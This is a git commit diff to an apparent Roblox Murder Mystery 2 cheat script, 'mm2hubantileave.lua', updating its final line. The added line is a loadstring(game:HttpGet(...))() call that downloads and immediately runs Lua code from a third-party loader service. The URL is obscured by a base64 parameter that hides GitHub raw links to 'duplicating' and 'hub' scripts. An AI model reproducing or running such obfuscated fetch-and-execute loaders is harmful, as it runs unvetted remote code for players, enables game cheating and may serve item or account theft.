87bfc23eb94b4e38223e217a762301913bb94d80
Johnnyissocoollol <progackerroblox@gmail.com>
2026-09-03 21:20:41 -0500

    Update loadstring URL in mm2hubantileave.lua

--- mm2hubantileave.lua
+++ mm2hubantileave.lua
@@ -44,4 +44,4 @@ else
     -- (do nothing, leave button remains functional)
 end
 
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvaGlpL3JlZnMvaGVhZHMvbWFpbi9tbTJkdXBsaWNhdGluZ3NjcmlwdC5sdWEifX0"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvbW0yL3JlZnMvaGVhZHMvbWFpbi9tbTJodWIubHVhIn19"))()
